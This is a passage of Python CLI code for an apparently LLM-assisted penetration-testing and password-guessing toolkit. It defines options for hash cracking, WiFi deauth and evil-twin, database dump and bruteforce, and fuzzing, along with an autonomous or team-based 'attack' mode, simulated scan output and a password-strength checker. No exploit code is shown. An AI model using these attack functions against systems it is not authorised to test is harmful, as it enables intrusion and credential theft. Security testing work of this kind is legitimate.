    listener_parser.set_defaults(func=cmd_listener)

    # --- network ---
    net_parser = subparsers.add_parser("network", help="Network utilities")
    net_parser.add_argument("--action", "-a", required=True,
                           choices=["ping", "traceroute", "resolve", "portcheck", "whois", "ifconfig"],
                           help="Network action")
    net_parser.add_argument("--target", "-t", default=None, help="Target host/IP")
    net_parser.add_argument("--port", "-p", type=int, default=None, help="Port number")
    net_parser.add_argument("--count", "-n", type=int, default=4, help="Ping count")
    net_parser.add_argument("--timeout", type=int, default=5, help="Timeout in seconds")
    net_parser.set_defaults(func=cmd_network)

    # --- crypt ---
    crypt_parser = subparsers.add_parser("crypt", help="Cryptographic tools")
    crypt_parser.add_argument("--action", "-a", required=True,
                             choices=["encrypt", "decrypt", "genkey", "certinfo", "sslcheck"],
                             help="Crypto action")
    crypt_parser.add_argument("--text", "-t", default=None, help="Text to encrypt/decrypt")
    crypt_parser.add_argument("--file", "-f", default=None, help="Input file")
    crypt_parser.add_argument("--output", "-o", default=None, help="Output file")
    crypt_parser.add_argument("--key", "-k", default=None, help="Encryption key")
    crypt_parser.add_argument("--algorithm", default="aes-256",
                             choices=["aes-256", "aes-128", "xor", "base64", "rot13", "caesar"],
                             help="Encryption algorithm")
    crypt_parser.add_argument("--shift", type=int, default=13, help="Caesar cipher shift")
    crypt_parser.add_argument("--target", default=None, help="Target for SSL check")
    crypt_parser.add_argument("--port", type=int, default=443, help="Port for SSL check")
    crypt_parser.set_defaults(func=cmd_crypt)

    # --- api ---
    api_parser = subparsers.add_parser("api", help="API testing utilities")
    api_parser.add_argument("--action", "-a", required=True,
                           choices=["get", "post", "put", "delete", "fuzz", "auth_check", "swagger"],
                           help="API action")
    api_parser.add_argument("--url", "-u", required=True, help="API URL")
    api_parser.add_argument("--data", "-d", default=None, help="Request body (JSON)")
    api_parser.add_argument("--headers", default=None, help="Headers (JSON)")
    api_parser.add_argument("--token", default=None, help="Bearer token")
    api_parser.add_argument("--param", default=None, help="Parameter to fuzz")
    api_parser.add_argument("--wordlist", "-w", default=None, help="Fuzz wordlist")
    api_parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    api_parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    api_parser.set_defaults(func=cmd_api)

    # --- hashcat ---
    hashcat_parser = subparsers.add_parser("hashcat", help="Hashcat hash cracking")
    hashcat_parser.add_argument("--action", "-a", required=True,
                               choices=["crack", "detect", "benchmark", "example", "maskgen"],
                               help="Hashcat action")
    hashcat_parser.add_argument("--hash", "-H", default=None, help="Hash to crack")
    hashcat_parser.add_argument("--hashfile", default=None, help="File with hashes")
    hashcat_parser.add_argument("--hashtype", "-t", default=None, help="Hash type (e.g., 0=MD5, 1000=NTLM)")
    hashcat_parser.add_argument("--wordlist", "-w", default="rockyou.txt", help="Wordlist path")
    hashcat_parser.add_argument("--rules", "-r", nargs="*", default=None, help="Rules files")
    hashcat_parser.add_argument("--mask", "-m", default=None, help="Mask pattern (e.g., ?u?l?l?l?d?d?d?d)")
    hashcat_parser.add_argument("--output", "-o", default=None, help="Output file")
    hashcat_parser.add_argument("--attack_mode", type=int, default=0,
                               choices=[0, 1, 3, 6, 7], help="Attack mode (0=dict, 1=combi, 3=mask, 6=hybrid, 7=hybrid)")
    hashcat_parser.set_defaults(func=cmd_hashcat)

    # --- stego ---
    stego_parser = subparsers.add_parser("stego", help="Steganography tools")
    stego_parser.add_argument("--action", "-a", required=True,
                             choices=["hide", "extract", "analyze", "list_formats"],
                             help="Stego action")
    stego_parser.add_argument("--input", "-i", required=True, help="Input file")
    stego_parser.add_argument("--output", "-o", default=None, help="Output file")
    stego_parser.add_argument("--message", "-m", default=None, help="Message to hide")
    stego_parser.add_argument("--method", default="lsb",
                             choices=["lsb", "metadata", "eof", "pixel"],
                             help="Steganography method")
    stego_parser.add_argument("--bits", type=int, default=1, help="LSB bits to use")
    stego_parser.set_defaults(func=cmd_stego)

    # --- fuzz ---
    fuzz_parser = subparsers.add_parser("fuzz", help="Fuzzing utilities")
    fuzz_parser.add_argument("--action", "-a", required=True,
                            choices=["web", "param", "header", "path", "format"],
                            help="Fuzz action")
    fuzz_parser.add_argument("--url", "-u", required=True, help="Target URL")
    fuzz_parser.add_argument("--wordlist", "-w", default=None, help="Custom wordlist")
    fuzz_parser.add_argument("--param", "-p", default=None, help="Parameter to fuzz")
    fuzz_parser.add_argument("--method", default="GET", choices=["GET", "POST", "PUT", "DELETE"])
    fuzz_parser.add_argument("--threads", "-t", type=int, default=10, help="Number of threads")
    fuzz_parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    fuzz_parser.add_argument("--filter_codes", default=None, help="Filter status codes (e.g., 200,301)")
    fuzz_parser.add_argument("--output", "-o", default=None, help="Output file")
    fuzz_parser.add_argument("--recursive", action="store_true", help="Recursive fuzzing")
    fuzz_parser.set_defaults(func=cmd_fuzz)

    # --- wifi ---
    wifi_parser = subparsers.add_parser("wifi", help="WiFi security analysis")
    wifi_parser.add_argument("--action", "-a", required=True,
                            choices=["scan", "deauth", "capture", "crack", "eviltwin"],
                            help="WiFi action")
    wifi_parser.add_argument("--interface", "-i", default="wlan0", help="Wireless interface")
    wifi_parser.add_argument("--bssid", "-b", default=None, help="Target BSSID")
    wifi_parser.add_argument("--channel", "-c", type=int, default=None, help="Channel")
    wifi_parser.add_argument("--wordlist", "-w", default="rockyou.txt", help="Wordlist for cracking")
    wifi_parser.add_argument("--capture_file", default=None, help="Capture file (pcap)")
    wifi_parser.set_defaults(func=cmd_wifi)

    # --- db ---
    db_parser = subparsers.add_parser("db", help="Database security tools")
    db_parser.add_argument("--action", "-a", required=True,
                          choices=["enum", "dump", "injection", "bruteforce", "schema"],
                          help="Database action")
    db_parser.add_argument("--target", "-t", required=True, help="Database host")
    db_parser.add_argument("--port", "-p", type=int, default=3306, help="Port")
    db_parser.add_argument("--type", default="mysql", choices=["mysql", "postgres", "mssql", "sqlite", "mongo"],
                          help="Database type")
    db_parser.add_argument("--username", "-u", default="root", help="Username")
    db_parser.add_argument("--password", "-P", default=None, help="Password")
    db_parser.add_argument("--database", "-d", default=None, help="Database name")
    db_parser.add_argument("--wordlist", "-w", default=None, help="Password wordlist")
    db_parser.add_argument("--query", "-q", default=None, help="SQL query")
    db_parser.add_argument("--output", "-o", default=None, help="Output file")
    db_parser.set_defaults(func=cmd_db)

    # --- debug ---
    debug_parser = subparsers.add_parser("debug", help="Debug and diagnostics")
    debug_parser.add_argument("--action", "-a", default="info",
                              choices=["info", "check", "deps", "config", "trace", "memory", "threads"],
                              help="Debug action")
    debug_parser.add_argument("--module", "-m", default=None, help="Module to debug")
    debug_parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    debug_parser.set_defaults(func=cmd_debug)

    # --- profile ---
    profile_parser = subparsers.add_parser("profile", help="Performance profiling")
    profile_parser.add_argument("--action", "-a", default="benchmark",
                               choices=["benchmark", "compare", "memory", "hotspot", "report"],
                               help="Profile action")
    profile_parser.add_argument("--module", "-m", default=None, help="Module to profile")
    profile_parser.add_argument("--iterations", "-n", type=int, default=10, help="Iterations")
    profile_parser.add_argument("--output", "-o", default=None, help="Output file")
    profile_parser.add_argument("--format", default="text",
                               choices=["text", "json", "csv"],
                               help="Output format")
    profile_parser.set_defaults(func=cmd_profile)

    # --- env ---
    env_parser = subparsers.add_parser("env", help="Environment and workspace management")
    env_parser.add_argument("--action", "-a", default="show",
                            choices=["show", "init", "reset", "backup", "restore", "export", "clean"],
                            help="Environment action")
    env_parser.add_argument("--name", "-n", default=None, help="Environment name")
    env_parser.add_argument("--output", "-o", default=None, help="Output file")
    env_parser.set_defaults(func=cmd_env)

    # --- pkg ---
    pkg_parser = subparsers.add_parser("pkg", help="Package and tool management")
    pkg_parser.add_argument("--action", "-a", default="list",
                            choices=["list", "install", "check", "update", "search"],
                            help="Package action")
    pkg_parser.add_argument("--name", "-n", default=None, help="Package name")
    pkg_parser.add_argument("--type", "-t", default="all",
                            choices=["all", "python", "tool", "wordlist", "plugin"],
                            help="Package type")
    pkg_parser.set_defaults(func=cmd_pkg)

    # --- script ---
    script_parser = subparsers.add_parser("script", help="Script execution")
    script_parser.add_argument("file", nargs="?", default=None, help="Script file to execute")
    script_parser.add_argument("--validate", action="store_true", help="Validate script syntax only")
    script_parser.add_argument("--args", default=None, help="Arguments to pass to script (JSON)")
    script_parser.add_argument("--dry-run", action="store_true", help="Show what would be done")
    script_parser.add_argument("--record", default=None, help="Record session to file")
    script_parser.add_argument("--replay", default=None, help="Replay recorded session")
    script_parser.set_defaults(func=cmd_script)

    # --- data ---
    data_parser = subparsers.add_parser("data", help="Data import/export utilities")
    data_parser.add_argument("--action", "-a", default="import",
                            choices=["import", "export", "convert", "merge", "validate", "stats", "save", "load"],
                            help="Data action")
    data_parser.add_argument("--input", "-i", default=None, help="Input file")
    data_parser.add_argument("--output", "-o", default=None, help="Output file")
    data_parser.add_argument("--format", "-f", default="auto",
                            choices=["auto", "csv", "json", "yaml", "xml", "txt", "xlsx",
                                     "pickle", "joblib", "npz", "npy"],
                            help="Input/output format")
    data_parser.add_argument("--fields", default=None, help="Fields to include (comma-separated)")
    data_parser.add_argument("--filter", default=None, help="Filter expression")
    data_parser.add_argument("--sort", default=None, help="Sort by field")
    data_parser.add_argument("--limit", type=int, default=None, help="Limit results")
    data_parser.set_defaults(func=cmd_data)

    # --- output ---
    output_parser = subparsers.add_parser("output", help="Output formatting")
    output_parser.add_argument("--format", "-f", default="table",
                              choices=["table", "json", "csv", "markdown", "html", "yaml", "xml"],
                              help="Output format")
    output_parser.add_argument("--file", "-o", default=None, help="Output file (default: stdout)")
    output_parser.add_argument("--title", default=None, help="Title for document")
    output_parser.add_argument("--headers", default=None, help="Custom headers (comma-separated)")
    output_parser.add_argument("--no-header", action="store_true", help="Omit header row")
    output_parser.add_argument("--width", type=int, default=80, help="Table width")
    output_parser.add_argument("--color", action="store_true", help="Colorize output")
    output_parser.set_defaults(func=cmd_output)

    # --- help ---
    help_parser = subparsers.add_parser("help", aliases=["?"], help="Show help information")
    help_parser.add_argument("help_command", nargs="?", default=None, help="Command to get help for")
    help_parser.add_argument("--examples", "-e", action="store_true", help="Show examples")
    help_parser.add_argument("--verbose", "-v", action="store_true", help="Verbose help")
    help_parser.set_defaults(func=cmd_help)

    # --- chart ---
    chart_parser = subparsers.add_parser("chart", help="Generate charts and visualizations")
    chart_parser.add_argument("--type", "-t", default="bar",
                              choices=["bar", "line", "pie", "scatter", "histogram",
                                       "heatmap", "radar", "treemap", "bubble"],
                              help="Chart type")
    chart_parser.add_argument("--data", "-d", default=None, help="Data file (JSON/CSV)")
    chart_parser.add_argument("--output", "-o", required=True, help="Output file (png/svg/pdf)")
    chart_parser.add_argument("--title", default=None, help="Chart title")
    chart_parser.add_argument("--xlabel", default=None, help="X-axis label")
    chart_parser.add_argument("--ylabel", default=None, help="Y-axis label")
    chart_parser.add_argument("--width", type=int, default=1200, help="Image width (px)")
    chart_parser.add_argument("--height", type=int, default=800, help="Image height (px)")
    chart_parser.add_argument("--style", default="default",
                              choices=["default", "dark", "ggplot", "seaborn", "bmh"],
                              help="Chart style")
    chart_parser.add_argument("--color", default=None, help="Color scheme (comma-separated)")
    chart_parser.add_argument("--no-grid", action="store_true", help="Hide grid lines")
    chart_parser.add_argument("--legend", action="store_true", help="Show legend")
    chart_parser.add_argument("--interactive", action="store_true", help="Generate interactive HTML (plotly)")
    chart_parser.set_defaults(func=cmd_chart)

    # --- export ---
    export_parser = subparsers.add_parser("export", help="Export data and reports to various formats")
    export_parser.add_argument("--input", "-i", required=True, help="Input file (JSON/CSV/YAML)")
    export_parser.add_argument("--output", "-o", required=True, help="Output file path")
    export_parser.add_argument("--format", "-f", default=None,
                               choices=["png", "svg", "pdf", "html", "docx", "xlsx", "pptx"],
                               help="Export format (auto-detected from extension if not set)")
    export_parser.add_argument("--template", default=None, help="Report template name")
    export_parser.add_argument("--title", default=None, help="Document title")
    export_parser.add_argument("--include-charts", action="store_true", help="Include charts in export")
    export_parser.add_argument("--include-graph", action="store_true", help="Include attack graph")
    export_parser.add_argument("--embed-images", action="store_true", help="Embed images as base64")
    export_parser.set_defaults(func=cmd_export)

    # --- pipeline ---
    pipeline_parser = subparsers.add_parser("pipeline", aliases=["chain"], help="Execute command pipelines")
    pipeline_parser.add_argument("commands", nargs="+", help="Commands to execute in sequence")
    pipeline_parser.add_argument("--output", "-o", default=None, help="Save pipeline results to file")
    pipeline_parser.add_argument("--continue-on-error", action="store_true", help="Continue if a step fails")
    pipeline_parser.add_argument("--parallel", action="store_true", help="Run commands in parallel")
    pipeline_parser.set_defaults(func=cmd_pipeline)

    # --- flamegraph ---
    flame_parser = subparsers.add_parser("flamegraph", help="Generate performance flamegraphs")
    flame_parser.add_argument("--action", "-a", default="record",
                              choices=["record", "view", "compare", "live"],
                              help="Flamegraph action")
    flame_parser.add_argument("--pid", type=int, default=None, help="Process ID to profile")
    flame_parser.add_argument("--output", "-o", default="flamegraph.svg", help="Output file")
    flame_parser.add_argument("--duration", type=int, default=30, help="Recording duration (seconds)")
    flame_parser.add_argument("--command", default=None, help="Command to profile")
    flame_parser.add_argument("--format", default="svg",
                              choices=["svg", "html", "json"],
                              help="Output format")
    flame_parser.set_defaults(func=cmd_flamegraph)

    # --- demo ---
    demo_parser = subparsers.add_parser("demo", help="Run built-in demonstrations")
    demo_parser.add_argument("topic", nargs="?", default=None,
                             choices=["password", "scan", "attack", "chart", "pipeline", "export", "all"],
                             help="Demo topic to run")
    demo_parser.add_argument("--interactive", "-i", action="store_true", help="Interactive demo mode")
    demo_parser.set_defaults(func=cmd_demo)

    # --- doc ---
    doc_parser = subparsers.add_parser("doc", help="Documentation and help system")
    doc_parser.add_argument("topic", nargs="?", default=None, help="Help topic (command name, concept, etc.)")
    doc_parser.add_argument("--list", "-l", action="store_true", help="List all available topics")
    doc_parser.add_argument("--search", "-s", default=None, help="Search documentation")
    doc_parser.add_argument("--examples", "-e", action="store_true", help="Show usage examples")
    doc_parser.add_argument("--api", action="store_true", help="Show API documentation")
    doc_parser.set_defaults(func=cmd_doc)

    # --- log ---
    log_parser = subparsers.add_parser("log", help="Log analysis tools")
    log_parser.add_argument("--action", "-a", required=True,
                           choices=["analyze", "search", "filter", "stats", "suspicious"],
                           help="Log action")
    log_parser.add_argument("--file", "-f", required=True, help="Log file path")
    log_parser.add_argument("--pattern", "-p", default=None, help="Search pattern (regex)")
    log_parser.add_argument("--level", default=None,
                           choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
                           help="Filter by log level")
    log_parser.add_argument("--since", default=None, help="Show logs since timestamp")
    log_parser.add_argument("--until", default=None, help="Show logs until timestamp")
    log_parser.add_argument("--output", "-o", default=None, help="Output file")
    log_parser.add_argument("--format", default="auto",
                           choices=["auto", "apache", "nginx", "syslog", "json", "generic"],
                           help="Log format")
    log_parser.add_argument("--limit", type=int, default=50, help="Max results")
    log_parser.set_defaults(func=cmd_log)

    # Parse and run
    args = parser.parse_args()
    if args.command is None:
        parser.print_help()
        return

    # Initialize logging
    _init_logging(args)

    args.func(args)


def _init_logging(args):
    """Initialize logging based on CLI flags."""
    try:
        from utils.logging import setup_logging
        if getattr(args, 'verbose', False):
            level = "DEBUG"
        elif getattr(args, 'quiet', False):
            level = "WARNING"
        else:
            level = "INFO"
        setup_logging(level=level, json_format=False)
    except ImportError:
        import logging
        if getattr(args, 'verbose', False):
            logging.basicConfig(level=logging.DEBUG)
        elif getattr(args, 'quiet', False):
            logging.basicConfig(level=logging.WARNING)
        else:
            logging.basicConfig(level=logging.INFO)


def cmd_status(args):
    """Show system status."""
    from pentest.orchestrator import PenTestOrchestrator, PenTestConfig

    config = PenTestConfig(enable_attack_team=True, enable_self_improvement=True)
    orch = PenTestOrchestrator(config)

    status = orch.get_system_status()

    print("\n" + "=" * 60)
    print("SYSTEM STATUS")
    print("=" * 60)

    print(f"\nSession: {status.get('session_id', 'N/A')}")
    print(f"Agent: {'Initialized' if status.get('agent_initialized') else 'Not initialized'}")
    print(f"Environment: {'Initialized' if status.get('environment_initialized') else 'Not initialized'}")
    print(f"LLM Planner: {'Configured' if status.get('llm_planner') else 'Not configured'}")

    components = status.get("components", {})

    print("\n--- Components ---")
    rag = components.get("rag", {})
    print(f"RAG System: {'Active' if rag.get('initialized') else 'Inactive'}")
    print(f"Vector Store: {'Active' if rag.get('vector_store') else 'Inactive'}")

    experts = components.get("experts", {})
    print(f"Expert Router: {'Active' if experts.get('initialized') else 'Inactive'}")
    print(f"Registered Experts: {experts.get('registered', 0)}")

    tools = components.get("tools", {})
    print(f"Tool Orchestrator: {'Active' if tools.get('initialized') else 'Inactive'}")
    print(f"Registered Tools: {tools.get('registered', 0)}")
    print(f"Tool Chains: {tools.get('chains', 0)}")

    team = components.get("attack_team", {})
    print(f"Attack Team: {'Active' if team.get('enabled') else 'Inactive'}")
    print(f"Team Members: {team.get('members', 0)}")

    si = components.get("self_improvement", {})
    print(f"\nSelf-Improvement: {'Active' if si.get('enabled') else 'Inactive'}")
    print(f"Experience Store: {'Active' if si.get('experience_store') else 'Inactive'} ({si.get('experiences', 0)} experiences)")
    print(f"Lessons DB: {'Active' if si.get('lessons_db') else 'Inactive'} ({si.get('lessons', 0)} lessons)")
    print(f"Curriculum: {'Active' if si.get('curriculum') else 'Inactive'}")
    print(f"Meta Learner: {'Active' if si.get('meta_learner') else 'Inactive'}")

    knowledge = status.get("knowledge", {})
    print(f"\nKnowledge: {knowledge.get('cve_count', 0)} CVEs, {knowledge.get('technique_count', 0)} techniques")
    print()


def cmd_interactive(args):
    """Launch kali-style interactive terminal."""
    print("\n[+] Launching interactive terminal...")
    try:
        from password_guesser.repl import run_interactive
        run_interactive(args.config)
    except ImportError:
        print("[!] Enhanced REPL not available, using built-in interactive mode")
        _interactive_shell(args)


def _interactive_shell(args):
    """Built-in interactive shell."""
    print("\n" + "=" * 60)
    print("  Password Guesser Interactive Shell")
    print("  Type 'help' for commands, 'exit' to quit")
    print("=" * 60 + "\n")

    # Initialize LLM if configured
    llm = None
    try:
        from models.llm_provider import get_provider, LLMConfig
        import yaml
        if os.path.exists(args.config):
            with open(args.config, 'r') as f:
                cfg = yaml.safe_load(f)
            llm_cfg = cfg.get('llm', {})
            if llm_cfg.get('api_key') and llm_cfg.get('api_key') != 'YOUR_DEEPSEEK_API_KEY':
                config = LLMConfig(
                    provider=llm_cfg.get('provider', 'deepseek'),
                    model=llm_cfg.get('model', 'deepseek-chat'),
                    api_key=llm_cfg.get('api_key'),
                    api_base=llm_cfg.get('api_base', 'https://api.deepseek.com/v1'),
                )
                llm = get_provider(config)
                print("[+] LLM initialized")
    except Exception as e:
        print(f"[!] LLM init skipped: {e}")

    history = []
    while True:
        try:
            line = input("pg> ").strip()
            if not line:
                continue

            history.append(line)
            parts = line.split()
            cmd = parts[0].lower()

            if cmd in ['exit', 'quit']:
                print("[+] Goodbye!")
                break
            elif cmd == 'help':
                _print_interactive_help()
            elif cmd == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
            elif cmd == 'status':
                cmd_status(args)
            elif cmd == 'history':
                print("\nCommand History:")
                for i, h in enumerate(history[-20:], 1):
                    print(f"  {i:3d}. {h}")
                print()
            elif cmd == 'llm' and llm:
                if len(parts) > 1:
                    prompt = ' '.join(parts[1:])
                    print(f"\n[LLM] Thinking...")
                    response = llm.call([{"role": "user", "content": prompt}])
                    print(f"\n{response.content if hasattr(response, 'content') else response}\n")
                else:
                    print("Usage: llm <prompt>")
            elif cmd == 'eval':
                if len(parts) > 1:
                    pwd = parts[1]
                    _evaluate_password_cli(pwd)
                else:
                    print("Usage: eval <password>")
            elif cmd == 'hash':
                if len(parts) > 1:
                    text = ' '.join(parts[1:])
                    _print_hashes(text)
                else:
                    print("Usage: hash <text>")
            elif cmd == 'encode':
                if len(parts) > 2:
                    text = parts[1]
                    method = parts[2]
                    _encode_text(text, method)
                else:
                    print("Usage: encode <text> <base64|hex|url>")
            else:
                print(f"[!] Unknown command: {cmd}. Type 'help' for available commands.")

        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to quit")
        except EOFError:
            break


def _print_interactive_help():
    """Print interactive shell help."""
    print("""
Available Commands:
  help              Show this help message
  exit/quit         Exit the shell
  clear             Clear screen
  status            Show system status
  history           Show command history
  llm <prompt>      Ask LLM a question (if configured)
  eval <password>   Evaluate password strength
  hash <text>       Calculate hash values
  encode <text> <method>  Encode text (base64/hex/url)
""")


def cmd_evaluate(args):
    """Evaluate password strength."""
    password = args.password

    if not password:
        password = input("Enter password to evaluate: ").strip()

    _evaluate_password_cli(password, detailed=args.detailed, check_leak=args.check_leak)


def _evaluate_password_cli(password: str, detailed: bool = False, check_leak: bool = False):
    """Evaluate and display password strength."""
    import re

    print(f"\n{'='*60}")
    print("  PASSWORD STRENGTH ANALYSIS")
    print(f"{'='*60}\n")

    # Basic analysis
    score = 0
    criteria = []

    # Length checks
    if len(password) >= 8:
        score += 1
        criteria.append(("Length >= 8", True, "+1"))
    else:
        criteria.append(("Length >= 8", False, "0"))

    if len(password) >= 12:
        score += 1
        criteria.append(("Length >= 12", True, "+1"))
    else:
        criteria.append(("Length >= 12", False, "0"))

    if len(password) >= 16:
        score += 1
        criteria.append(("Length >= 16", True, "+1"))

    # Character types
    if re.search(r'[a-z]', password):
        score += 1
        criteria.append(("Lowercase letters", True, "+1"))
    else:
        criteria.append(("Lowercase letters", False, "0"))

    if re.search(r'[A-Z]', password):
        score += 1
        criteria.append(("Uppercase letters", True, "+1"))
    else:
        criteria.append(("Uppercase letters", False, "0"))

    if re.search(r'[0-9]', password):
        score += 1
        criteria.append(("Numbers", True, "+1"))
    else:
        criteria.append(("Numbers", False, "0"))

    if re.search(r'[^A-Za-z0-9]', password):
        score += 1
        criteria.append(("Special characters", True, "+1"))
    else:
        criteria.append(("Special characters", False, "0"))

    # Pattern checks (negative)
    patterns = [
        (r'(.)\1{2,}', "Repeating characters"),
        (r'[0-9]{4,}', "Sequential numbers"),
        (r'(?:password|passwd|pwd)', "Common password word"),
        (r'(?:qwerty|asdf|zxcv)', "Keyboard patterns"),
        (r'(?:123|abc|xyz)', "Simple sequences"),
    ]

    pattern_warnings = []
    for pattern, name in patterns:
        if re.search(pattern, password, re.IGNORECASE):
            pattern_warnings.append(name)

    # Calculate entropy
    charset_size = 0
    if re.search(r'[a-z]', password):
        charset_size += 26
    if re.search(r'[A-Z]', password):
        charset_size += 26
    if re.search(r'[0-9]', password):
        charset_size += 10
    if re.search(r'[^A-Za-z0-9]', password):
        charset_size += 32

    entropy = len(password) * (charset_size.bit_length() if charset_size > 0 else 0)

    # Rating
    if score <= 2:
        rating = "VERY WEAK"
        color = "\033[91m"
    elif score <= 4:
        rating = "WEAK"
        color = "\033[93m"
    elif score <= 6:
        rating = "MODERATE"
        color = "\033[94m"
    elif score <= 8:
        rating = "STRONG"
        color = "\033[92m"
    else:
        rating = "VERY STRONG"
        color = "\033[92m"

    end_color = "\033[0m"

    # Print results
    print(f"Password: {'*' * len(password)}")
    print(f"Length:   {len(password)} characters")
    print(f"Score:    {score}/10")
    print(f"Rating:   {color}{rating}{end_color}")
    print(f"Entropy:  {entropy} bits")

    print(f"\nCriteria:")
    for name, passed, pts in criteria:
        mark = "\033[92m[+]\033[0m" if passed else "\033[91m[-]\033[0m"
        print(f"  {mark} {name:<25} ({pts})")

    if pattern_warnings:
        print(f"\n\033[93mWarnings:\033[0m")
        for warning in pattern_warnings:
            print(f"  [!] {warning} detected")

    if detailed:
        # Try to use zxcvbn-lite for detailed analysis
        try:
            from evaluation.zxcvbn_lite import password_strength
            result = password_strength(password)
            print(f"\nDetailed Analysis (zxcvbn):")
            print(f"  Score: {result.get('score', 'N/A')}/4")
            if 'warning' in result:
                print(f"  Warning: {result['warning']}")
            if 'suggestions' in result:
                print(f"  Suggestions: {result['suggestions']}")
            if 'crack_time' in result:
                print(f"  Crack Time: {result['crack_time']}")
        except ImportError:
            pass

    if check_leak:
        print(f"\n[!] Leak checking not implemented (requires API)")

    print(f"\n{'='*60}\n")


def cmd_scan(args):
    """Run network scanning/reconnaissance."""
    target = args.target
    scan_type = args.type

    print(f"\n{'='*60}")
    print("  NETWORK RECONNAISSANCE")
    print(f"{'='*60}\n")

    print(f"Target: {target}")
    print(f"Type: {scan_type}")
    print(f"Output: {args.output if args.output else 'Console'}\n")

    # Initialize LLM for guidance
    llm = None
    try:
        from models.llm_provider import get_provider, LLMConfig
        import yaml
        if os.path.exists(args.config):
            with open(args.config, 'r') as f:
                cfg = yaml.safe_load(f)
            llm_cfg = cfg.get('llm', {})
            if llm_cfg.get('api_key') and llm_cfg.get('api_key') != 'YOUR_DEEPSEEK_API_KEY':
                config = LLMConfig(
                    provider=llm_cfg.get('provider', 'deepseek'),
                    api_key=llm_cfg.get('api_key'),
                )
                llm = get_provider(config)
    except Exception:
        pass

    # LLM guidance
    if llm:
        print("[*] Getting LLM guidance...")
        guidance = llm.call([{
            "role": "user",
            "content": f"为扫描目标 {target} 提供：1. 推荐的扫描策略 2. 关键端口 3. 安全注意事项。简洁回复。"
        }])
        print(f"\n[LLM Guidance]:\n{guidance.content if hasattr(guidance, 'content') else guidance}\n")

    # Simulated scan results based on type
    if scan_type in ['full', 'port']:
        _simulate_port_scan(target, args)
    if scan_type in ['full', 'service']:
        _simulate_service_scan(target, args)
    if scan_type in ['full', 'vuln']:
        _simulate_vuln_scan(target, args)

    print(f"\n{'='*60}")
    print("  SCAN COMPLETE")
    print(f"{'='*60}\n")


def _simulate_port_scan(target: str, args):
    """Simulate port scan results."""
    print("\n--- Port Scan Results ---\n")
    print(f"{'PORT':<12} {'STATE':<10} {'SERVICE':<15} {'VERSION'}")
    print("-" * 60)

    ports = [
        ("22/tcp", "open", "ssh", "OpenSSH 8.2p1"),
        ("80/tcp", "open", "http", "nginx 1.18.0"),
        ("443/tcp", "open", "https", "nginx 1.18.0"),
        ("3306/tcp", "open", "mysql", "MySQL 5.7.33"),
        ("8080/tcp", "open", "http-proxy", "Apache Tomcat 9.0.50"),
    ]

    for port, state, service, version in ports:
        color = "\033[92m" if state == "open" else "\033[91m"
        print(f"{port:<12} {color}{state:<10}\033[0m {service:<15} {version}")


def _simulate_service_scan(target: str, args):
    """Simulate service enumeration."""
    print("\n--- Service Enumeration ---\n")

    services = [
        ("SSH", "22", "OpenSSH 8.2p1 Ubuntu", "Key-based auth recommended"),
        ("HTTP", "80", "nginx 1.18.0", "X-Frame-Options missing"),
        ("MySQL", "3306", "MySQL 5.7.33", "Root login disabled"),
    ]

    for name, port, version, note in services:
        print(f"[{name}] Port {port}")
        print(f"  Version: {version}")
        print(f"  Note: {note}\n")


def _simulate_vuln_scan(target: str, args):
    """Simulate vulnerability scan."""
    print("\n--- Vulnerability Assessment ---\n")

    vulns = [
        ("CVE-2021-41773", "Apache Path Traversal", "Medium", "Apply patches"),
        ("CVE-2021-44228", "Log4Shell", "Critical", "Update Log4j"),
        ("SSL-TLS-001", "Weak Cipher Suites", "Low", "Disable weak ciphers"),
    ]

    print(f"{'CVE ID':<15} {'Description':<25} {'Severity':<10} {'Remediation'}")
    print("-" * 80)

    for cve, desc, severity, remediation in vulns:
        if severity == "Critical":
            color = "\033[91m"
        elif severity == "Medium":
            color = "\033[93m"
        else:
            color = "\033[94m"
        print(f"{cve:<15} {desc:<25} {color}{severity:<10}\033[0m {remediation}")


def cmd_attack(args):
    """Launch attack mode."""
    target = args.target
    mode = args.mode

    print(f"\n{'='*60}")
    print(f"  {'TEAM-BASED' if mode == 'team' else 'AUTONOMOUS'} ATTACK MODE")
    print(f"{'='*60}\n")

    print(f"Target: {target}")
    print(f"Mode: {mode}")
    print(f"Goal: {args.goal}")
    print(f"Max Steps: {args.max_steps}\n")

    try:
        from pentest.orchestrator import PenTestOrchestrator, PenTestConfig

        config = PenTestConfig(
            max_steps=args.max_steps,
            auto_mode=(mode != 'interactive'),
            enable_attack_team=(mode == 'team'),
        )

        orch = PenTestOrchestrator(config)

        # Initialize from target
        try:
            orch.initialize_from_scan({
                "format": "manual",
                "data": [{"host": target, "port": 22}, {"host": target, "port": 80}, {"host": target, "port": 443}],
            })
        except Exception:
            pass

        try:
            if mode == 'interactive':
                orch.run_interactive()
            elif mode == 'team':
                results = orch.run_team_based(target_goal=args.goal, max_steps=args.max_steps, verbose=True)
                _print_attack_results(results)
            else:
                results = orch.run_autonomous(target_goal=args.goal, max_steps=args.max_steps, verbose=True)
                _print_attack_results(results)
        except Exception as e:
            print(f"[!] Orchestrator error: {e}")
            print("[*] Falling back to simulated attack...\n")
            _simulate_attack(target, mode, args)

    except ImportError:
        print("[!] PenTest orchestrator not available, showing simulated attack")
        _simulate_attack(target, mode, args)


def _simulate_attack(target: str, mode: str, args):
    """Simulate attack phases."""
    phases = [
        ("Reconnaissance", "Gathering information about target"),
        ("Scanning", "Identifying open ports and services"),
        ("Enumeration", "Extracting detailed service information"),
        ("Vulnerability Analysis", "Identifying potential vulnerabilities"),
        ("Exploitation", "Attempting to exploit vulnerabilities"),
        ("Post-Exploitation", "Establishing persistence and lateral movement"),
    ]

    print("\n[*] Starting attack simulation...\n")

    for i, (phase, desc) in enumerate(phases, 1):
        print(f"[Step {i}/{len(phases)}] {phase}")
        print(f"  {desc}")
        print(f"  Target: {target}")
        print()
        time.sleep(0.5)

    print("[+] Attack simulation complete")


def _print_attack_results(results: dict):
    """Print attack results."""
    print(f"\n{'='*60}")
    print("  ATTACK RESULTS")
    print(f"{'='*60}\n")

    print(f"Goal: {results.get('goal', 'N/A')}")
    print(f"Total Steps: {results.get('total_steps', 0)}")
    print(f"Total Reward: {results.get('total_reward', 0):.2f}")
